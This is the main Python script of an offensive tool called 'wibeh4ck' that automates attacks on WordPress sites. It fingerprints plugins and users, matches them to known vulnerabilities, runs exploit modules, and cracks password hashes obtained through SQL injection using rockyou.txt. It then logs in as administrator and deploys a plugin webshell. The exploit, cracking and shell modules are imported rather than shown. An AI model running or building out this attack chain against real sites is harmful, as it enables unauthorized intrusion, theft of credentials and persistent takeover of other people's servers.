#!/usr/bin/env python3
import argparse
import os
import time

from core import colors
from core.http import HTTP
from core.output import (
    banner, print_recon, print_matches, print_result,
    print_shell, export_json, write_report,
)
from recon.fingerprint import fingerprint
from recon.db import load_db, match_vulns
from exploit.loader import load_modules, run_exploits
from post.crack import crack_hashes
from post.login import try_logins
from post.shell import deploy_shell

DEFAULT_DB = "data/wordfence_sample.json"
DEFAULT_WORDLIST = "wordlists/rockyou.txt"
MODULES_DIR = "exploit/modules"


def main():
    p = argparse.ArgumentParser(prog="wibeh4ck")
    p.add_argument("-t", "--target", help="target URL")
    p.add_argument("--wordlist", default=DEFAULT_WORDLIST)
    p.add_argument("--proxy", default=None)
    p.add_argument("--report", nargs="?", const="wibeh4ck_report.txt", default=None,
                   help="write a text report (default: wibeh4ck_report.txt)")
    p.add_argument("--json", dest="json_out", default=None,
                   help="also dump raw JSON (optional)")
    p.add_argument("--shell-password", default=None)
    p.add_argument("--no-crack", action="store_true")
    p.add_argument("--no-shell", action="store_true")
    p.add_argument("--timeout", type=int, default=15)

    g = p.add_mutually_exclusive_group()
    g.add_argument("--color", dest="color", action="store_true", default=None)
    g.add_argument("--no-color", dest="color", action="store_false")

    args = p.parse_args()

    if args.color is not None:
        colors.enable(args.color)

    if not args.target:
        p.error("need --target")

    banner()
    start = time.time()
    http = HTTP(proxy=args.proxy, timeout=args.timeout)

    # recon
    print(colors.info("[*] fingerprinting target..."))
    try:
        recon = fingerprint(args.target, http)
    except Exception as e:
        print(colors.fail(f"[!] recon failed: {e}"))
        recon = {"target": args.target, "plugins": [], "users": [],
                 "waf": None, "wp_version": None, "rest_api": False}

    # match
    print(colors.info("[*] matching vulnerabilities..."))
    try:
        db = load_db(DEFAULT_DB)
        matches = match_vulns(recon.get("plugins", []), db)
    except Exception as e:
        print(colors.fail(f"[!] db/match failed: {e}"))
        matches = []

    print_recon(recon, matches)
    print_matches(matches)

    result = {
        "target": args.target,
        "recon": recon,
        "matches": matches,
        "exploit": None,
        "attempts": [],
        "cracked": None,
        "admin": None,
        "shell": None,
    }

    # exploit
    if matches:
        modules = load_modules(MODULES_DIR)
        print(colors.info(
            f"[*] {len(modules)} exploit module(s) loaded — attempting in CVSS order"
        ))
        try:
            exploit = run_exploits(
                args.target, recon, http, matches, modules,
                log=result["attempts"],
            )
        except Exception as e:
            print(colors.fail(f"[!] loader crashed: {e}"))
            exploit = None
        result["exploit"] = exploit

        # crack + login + shell only if SQLi users came back
        if exploit and exploit.get("type") == "sqli" and exploit.get("users"):
            hashes = [u["hash"] for u in exploit["users"] if u.get("hash")]
            if hashes and not args.no_crack:
                print(colors.info(f"[*] cracking {len(hashes)} hash(es) with {args.wordlist}"))
                try:
                    cracked = crack_hashes(hashes, args.wordlist)
                except Exception as e:
                    cracked = {"error": str(e), "cracked": {}}
                result["cracked"] = cracked

                if cracked.get("cracked"):
                    logins = [
                        {"user": u["login"], "pass": cracked["cracked"].get(u["hash"])}
                        for u in exploit["users"]
                        if u.get("hash") in cracked["cracked"]
                    ]
                    admin = try_logins(args.target, http, logins)
                    result["admin"] = admin

        if result["admin"] and not args.no_shell:
            pw = args.shell_password or os.urandom(12).hex()
            print(colors.info("[*] deploying plugin webshell..."))
            try:
                shell = deploy_shell(
                    args.target, http,
                    result["admin"]["user"],
                    result["admin"]["pass"], pw,
                )
            except Exception as e:
                shell = {"success": False, "error": str(e)}
            result["shell"] = shell
            print_shell(shell)

    result["elapsed"] = round(time.time() - start, 2)
    print_result(result)

    if args.json_out:
        try:
            export_json(args.json_out, result)
            print(colors.ok(f"[+] json written: {args.json_out}"))
        except Exception as e:
            print(colors.fail(f"[!] json write failed: {e}"))

    if args.report:
        try:
            write_report(args.report, result)
            print(colors.ok(f"[+] report written: {args.report}"))
        except Exception as e:
            print(colors.fail(f"[!] report write failed: {e}"))


if __name__ == "__main__":
    main()
